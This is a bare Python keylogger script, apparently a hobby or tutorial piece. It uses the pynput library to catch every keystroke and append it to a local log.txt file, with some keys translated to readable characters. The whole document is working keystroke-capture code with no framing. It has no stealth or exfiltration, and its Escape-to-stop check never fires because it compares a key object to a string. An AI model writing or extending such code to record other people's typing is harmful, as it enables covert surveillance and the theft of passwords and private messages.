import pynput
import datetime
from pynput.keyboard import Key, Listener

count=0
keys=[]

def on_press(key):
    global keys,count
    keys.append(key)
    count+=1
    print("{0} pressed".format(key))
    if count >=1:
        count=0
        write_file(keys)
        keys=[]

def write_file(keys):
    with open("log.txt","a") as f:
        for key in keys:
            key = str(key).replace("'", "")
            if key == 'Key.space':
                key = ' '
            if key == 'Key.shift_r':
                key = ''
            if key == "Key.enter":
                key = '\n'
            if key == 'Key.esc':
                key = ' Oh $#!t'
            f.write(str(key))

def on_release(key):
    if key == 'Key.esc':
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
    
